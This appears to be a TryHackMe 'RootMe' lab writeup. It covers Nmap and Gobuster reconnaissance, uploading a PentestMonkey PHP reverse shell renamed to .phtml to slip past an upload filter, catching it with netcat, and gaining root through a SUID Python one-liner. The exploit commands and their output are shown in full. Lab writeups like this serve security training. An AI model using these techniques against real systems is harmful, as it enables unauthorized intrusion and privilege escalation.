---

title: "RootMe | TryHackMe Writeup"
date: 2026-09-29T22:09:19+05:30
description: "TryHackMe RootMe writeup covering Nmap reconnaissance, web directory enumeration, insecure file upload, PHP extension bypass, reverse shell access, SUID enumeration, and Python-based privilege escalation."
summary: "Compromised the RootMe machine by discovering the hidden /panel/ directory, bypassing the PHP upload restriction with a .phtml extension to obtain a www-data reverse shell, and escalating to effective root privileges through the SUID-enabled Python interpreter."
platform: "tryhackme"
difficulty: "easy"
os: "Linux"
status: "active"
featured: true
featured_image: "/images/writeups/tryhackme/RootMe.png"
tags: ["linux", "web-enumeration", "gobuster", "file-upload", "upload-bypass", "phtml", "php", "reverse-shell", "www-data", "suid", "python", "python-suid", "privilege-escalation", "root"]
skills: ["nmap", "gobuster", "web-enumeration", "file-upload", "php", "phtml", "netcat", "reverse-shell", "tty-upgrade", "linux-enumeration", "suid", "python", "privilege-escalation"]
comments: false
draft: false
------------

## Overview

<img width="842" height="438" alt="rootme-tryhackme" src="/images/writeups/tryhackme/RootMe.png" />

RootMe is an easy TryHackMe machine that focuses on network reconnaissance, web directory enumeration, insecure file upload, PHP extension filtering bypass, reverse shell access, SUID enumeration, and interpreter-based privilege escalation.



### Key Vulnerabilities

* Hidden `/panel/` Directory
* Insecure File Upload
* PHP Extension Filtering Bypass
* `.phtml` Executable Extension
* PHP Reverse Shell
* Initial Access as `www-data`
* SUID-Enabled Python Interpreter
* Python SUID Privilege Escalation
* Effective UID `0`
* Root Privilege Escalation

---

## 🔎 Phase 2 — Reconnaissance

First, let's scan the target for all open TCP ports using **Nmap**.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 10.49.181.72
```

#### Nmap Output

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 10.49.181.72
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-29 06:07 -0700
Nmap scan report for 10.49.181.72
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:e3:b5:01:58:9d:b5:0e:05:22:0c:11:0f:fd:a8:0c (RSA)
|   256 61:a2:d5:ac:15:52:47:39:d5:e4:ff:95:2f:62:cb:33 (ECDSA)
|_  256 e1:ee:0e:d9:a2:26:46:8b:d5:23:02:c3:b9:a5:47:2e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.90 seconds
```

The scan reveals two open ports:

* **22/tcp** — SSH
* **80/tcp** — HTTP

### Task 2.1 — How many ports are open?

**Answer:** `2`

---

### Task 2.2 — What version of Apache is running?

The Nmap scan identifies the Apache version as:

**Answer:** `2.4.41`

---

### Task 2.3 — What service is running on port 22?

Port `22` is running:

**Answer:** `ssh`

---

## 🌐 Web Enumeration

Let's open port `80` in a browser and inspect the website.

<img width="1918" height="858" alt="Screenshot_2026-09-29_06_19_35" src="https://github.com/user-attachments/assets/b35ea28e-59af-4ef5-8962-9ea579272123" />

The page displays: `root@rootme:~# Can you root me?`

This suggests that the machine is intentionally vulnerable and that our goal is to obtain a shell and escalate our privileges to root.

### Directory Enumeration

Let's enumerate hidden directories using **Gobuster**.

```bash
gobuster dir -u http://10.49.181.72/ \
-w /usr/share/wordlists/dirb/common.txt
```

#### Gobuster Output

```text
$ gobuster dir -u http://10.49.181.72/ -w /usr/share/wordlists/dirb/common.txt   
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.181.72/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
css                  (Status: 301) [Size: 310] [--> http://10.49.181.72/css/]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [Size: 309] [--> http://10.49.181.72/js/]
panel                (Status: 301) [Size: 312] [--> http://10.49.181.72/panel/]
server-status        (Status: 403) [Size: 277]
uploads              (Status: 301) [Size: 314] [--> http://10.49.181.72/uploads/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

The interesting directories are:

* `/panel/`
* `/uploads/`

### Task 2.4 — What is the hidden directory?

**Answer:** `panel`

---

## 💻 Phase 3 — Getting the Shell

Since Gobuster discovered the `/panel/` directory, let's navigate to it.

<img width="1918" height="859" alt="Screenshot_2026-09-29_06_21_21" src="https://github.com/user-attachments/assets/71bf30ca-8305-4733-afce-a9f095840c76" />

The page contains a `file upload form`.

The objective is to upload a PHP reverse shell and obtain command execution on the target.

### Preparing the Reverse Shell

I'll use the **PentestMonkey PHP reverse shell**.

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Edit the reverse shell and configure the attacker IP and listening port:

```php
$ip = '192.168.170.200';
$port = 443;
```

Initially, let's try uploading the PHP file directly.

<img width="1918" height="859" alt="Screenshot_2026-09-29_06_31_24" src="https://github.com/user-attachments/assets/7a77c1dd-ac76-4b44-aaff-ac4e9113ac07" />

The server rejects the `.php` file.

This indicates that the upload functionality is filtering the PHP extension.

---

### Bypassing the Upload Restriction

Instead of using:

```text
.php
```

rename the file to:

```text
.phtml
```

The `.phtml` extension is accepted by the upload functionality.

<img width="1918" height="851" alt="Screenshot_2026-09-29_06_42_01" src="https://github.com/user-attachments/assets/122f6a88-2345-440d-b47e-ae5913eb8f30" />

The application responds with:

```text
The file was uploaded successfully!
```

This demonstrates an `insecure file upload vulnerability`, where the application blocks `.php` but allows another PHP-compatible extension.

---

### Starting the Listener

Start a Netcat listener on port `443`:

```bash
nc -lnvp 443
```

Now navigate to the `/uploads/` directory.

<img width="1918" height="862" alt="Screenshot_2026-09-29_06_31_42" src="https://github.com/user-attachments/assets/8e5ed036-6a7d-4dbe-94fc-b58ddbf3ad52" />

Our uploaded file is present: `php-reverse-shell.phtml`

Clicking the uploaded file causes the server to execute the reverse shell.

#### Reverse Shell

```text
$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.170.200] from (UNKNOWN) [10.49.181.72] 52466
Linux ip-10-49-181-72 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 13:45:05 up 47 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We successfully obtained a shell as:`www-data`.

---

## 🖥️ Reverse Shell TTY Upgrade

The initial reverse shell does not provide a proper interactive terminal.

Upgrade it using:

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then execute:

```bash
stty raw -echo; fg
```

Reset the terminal:

```bash
reset xterm
```

Set the required environment variables:

```bash
export TERM=xterm
export BASH=bash
```

Finally, configure the terminal dimensions:

```bash
stty cols 160 rows 45
```

We now have a more stable interactive TTY.

---

### Task 3.1 — Find the user flag

The user flag is:

```text
THM{y0u_g0t_*******}
```

---

## 🚀 Phase 4 — Privilege Escalation

Now that we have access as `www-data`, the next objective is to escalate our privileges to `root`.

---

### Task 4.1 — Find the unusual SUID file

SUID binaries can execute with the privileges of their file owner.

We can search for SUID-enabled files using:

```bash
find / -perm -4000 2>/dev/null
```

Among the results, the unusual SUID binary is:

```text
/usr/bin/python
```

This is interesting because a SUID-enabled Python interpreter can potentially be abused to execute commands with elevated privileges.

**Answer:**

```text
/usr/bin/python
```

---

### 👑 Task 4.2 — Privilege Escalation

Since `/usr/bin/python` has SUID privileges, we can use Python to execute a shell while preserving the effective UID.

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Verify our privileges:

```bash
www-data@ip-10-49-181-72:/$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id ; whoami; hostname
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root
ip-10-49-181-72
```

The important part is: `euid=0(root)`


---

## 🏴 Rooted

### User Flag

```text
THM{y0u_g0t_*******}
```

### Root Flag

```text
THM{pr1v1l3g3_**********}
```

---

## 🧾 Summary

- The attack started with basic network reconnaissance using **Nmap**, which identified SSH and HTTP as the two exposed services.

- Web enumeration with **Gobuster** discovered the hidden `/panel/` directory. The panel contained a file upload functionality that blocked `.php` files but allowed the `.phtml` extension.

- By uploading a PHP reverse shell with the `.phtml` extension and triggering it through the `/uploads/` directory, we obtained a shell as `www-data`.

- For privilege escalation, we searched for SUID-enabled binaries and discovered `/usr/bin/python`. Because Python had SUID privileges, it could be abused to execute a shell with an effective UID of `root`.

---

## 🚀 Key Takeaways

* Perform full TCP port scanning during initial reconnaissance.
* Enumerate web directories and hidden endpoints.
* Do not assume that blocking `.php` completely prevents PHP execution.
* Investigate alternative executable extensions such as `.phtml` during authorized testing.
* Search for SUID binaries after obtaining a low-privileged shell.
* SUID permissions on interpreters such as Python can lead to complete privilege escalation.
* Always verify your effective privileges using commands such as `id`.

---

